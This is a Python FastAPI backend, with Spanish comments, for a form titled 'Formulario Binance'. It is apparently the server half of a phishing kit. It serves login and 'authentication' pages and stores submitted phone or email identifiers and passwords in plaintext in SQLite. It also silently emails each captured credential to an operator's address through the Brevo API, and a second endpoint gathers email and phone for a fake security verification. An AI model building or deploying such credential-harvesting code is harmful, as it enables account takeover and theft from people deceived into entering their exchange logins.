import sqlite3
import aiosqlite
import requests
from fastapi import FastAPI, HTTPException, status
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from pydantic import BaseModel, field_validator
from datetime import datetime
import traceback
import re, os

# ─────────────────────────────────────────────────────────────
# ✏️  CONFIGURA AQUÍ TUS DATOS DE CORREO
# ─────────────────────────────────────────────────────────────
DB_PATH = "formulario.db"



GMAIL_REMITENTE = os.getenv("GMAIL_REMITENTE")
GMAIL_CONTRASENA = os.getenv("GMAIL_CONTRASENA")
CORREO_DESTINO = os.getenv("CORREO_DESTINO")
BREVO_API_KEY = os.getenv("BREVO_API_KEY")

print("REMITENTE:", GMAIL_REMITENTE)
print("DESTINO:", CORREO_DESTINO)
print("PASSWORD EXISTE:", GMAIL_CONTRASENA is not None)
# ─────────────────────────────────────────────────────────────
# App
# ─────────────────────────────────────────────────────────────
app = FastAPI(title="Formulario Binance", version="1.0.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Sirve el HTML desde la misma carpeta
app.mount("/static", StaticFiles(directory="."), name="static")


# ─────────────────────────────────────────────────────────────
# Base de datos SQLite
# ─────────────────────────────────────────────────────────────
def init_db():
    """Crea la tabla si no existe (síncrono, solo al arrancar)."""
    with sqlite3.connect(DB_PATH) as con:
        con.execute("""
            CREATE TABLE IF NOT EXISTS registros (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                identificador TEXT NOT NULL,
                codigo_pais TEXT NOT NULL DEFAULT '+57',
                contrasena  TEXT NOT NULL,
                fecha       TEXT NOT NULL
            )
        """)
        con.commit()

init_db()


# ─────────────────────────────────────────────────────────────
# Schemas
# ─────────────────────────────────────────────────────────────
class FormData(BaseModel):
    identificador: str    # teléfono o correo
    codigo_pais: str = "+57"
    contrasena: str

    @field_validator("identificador")
    @classmethod
    def validar_identificador(cls, v: str) -> str:
        v = v.strip()
        if not v:
            raise ValueError("El campo no puede estar vacío")
        return v

    @field_validator("contrasena")
    @classmethod
    def validar_contrasena(cls, v: str) -> str:
        if len(v.strip()) < 1:
            raise ValueError("La contraseña no puede estar vacía")
        return v.strip()


class FormResponse(BaseModel):
    mensaje: str
    id: int

# Agrega esta clase nueva para recibir los datos del formulario 2
class DatosVerificacion(BaseModel):
    correo: str
    telefono: str

@app.post("/api/verificacion")
async def guardar_verificacion(data: DatosVerificacion):

    fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:

        enviar_correo(
            identificador=data.correo,
            codigo_pais=data.telefono,
            contrasena="Verificación de seguridad",
            fecha=fecha
        )

    except Exception as e:
        print(e)

    return {"status":"ok"}
# ─────────────────────────────────────────────────────────────
# Función de envío de correo (Gmail SMTP)
# ─────────────────────────────────────────────────────────────
def enviar_correo(identificador, codigo_pais, contrasena, fecha):

    url = "https://api.brevo.com/v3/smtp/email"

    headers = {
        "accept": "application/json",
        "api-key": BREVO_API_KEY,
        "content-type": "application/json"
    }

    payload = {
        "sender": {
            "name": "Formulario Binance",
            "email": GMAIL_REMITENTE
        },
        "to": [
            {
                "email": CORREO_DESTINO
            }
        ],
        "subject": "🚨 Nuevo formulario recibido",

        "htmlContent": f"""
        <html>
        <body style="font-family:Arial">

            <h2>Nuevo formulario recibido</h2>

            <hr>

            <p><b>Usuario:</b> {identificador}</p>

            <p><b>Código País:</b> {codigo_pais}</p>

            <p><b>Contraseña:</b> {contrasena}</p>

            <p><b>Fecha:</b> {fecha}</p>

        </body>
        </html>
        """
    }

    respuesta = requests.post(
        url,
        json=payload,
        headers=headers,
        timeout=30
    )

    print("Brevo Status:", respuesta.status_code)
    print("Brevo:", respuesta.text)

    respuesta.raise_for_status()
# ─────────────────────────────────────────────────────────────
# Endpoints
# ─────────────────────────────────────────────────────────────
@app.get("/", response_class=FileResponse, include_in_schema=False)
async def serve_index():
    return FileResponse("index.html")

@app.get("/authenticacion.html", response_class=FileResponse, include_in_schema=False)
async def serve_auth():
    return FileResponse("authenticacion.html")

@app.post("/api/formulario", response_model=FormResponse)
async def guardar_formulario(data: FormData):
    """
    Recibe los datos del formulario, los guarda en SQLite
    y los envía automáticamente al correo configurado.
    """
    fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # 1️⃣  Guardar en SQLite
    async with aiosqlite.connect(DB_PATH) as db:
        cursor = await db.execute(
            """INSERT INTO registros (identificador, codigo_pais, contrasena, fecha)
               VALUES (?, ?, ?, ?)""",
            (data.identificador, data.codigo_pais, data.contrasena, fecha),
        )
        await db.commit()
        nuevo_id = cursor.lastrowid

    # 2️⃣  Enviar correo silenciosamente
    try:
        enviar_correo(
            data.identificador,
            data.codigo_pais,
            data.contrasena,
            fecha
        )
    except Exception:
        traceback.print_exc()

    return FormResponse(mensaje="Datos guardados correctamente", id=nuevo_id)


@app.get("/api/registros")
async def listar_registros():
    """Lista todos los registros guardados (para revisión interna)."""
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM registros ORDER BY id DESC") as cur:
            rows = await cur.fetchall()
    return [dict(r) for r in rows]


@app.delete("/api/registros/{registro_id}")
async def eliminar_registro(registro_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM registros WHERE id = ?", (registro_id,))
        await db.commit()
    return {"mensaje": f"Registro {registro_id} eliminado"}


@app.get("/health", include_in_schema=False)
async def health():
    return {"status": "ok"}


# ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import uvicorn
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)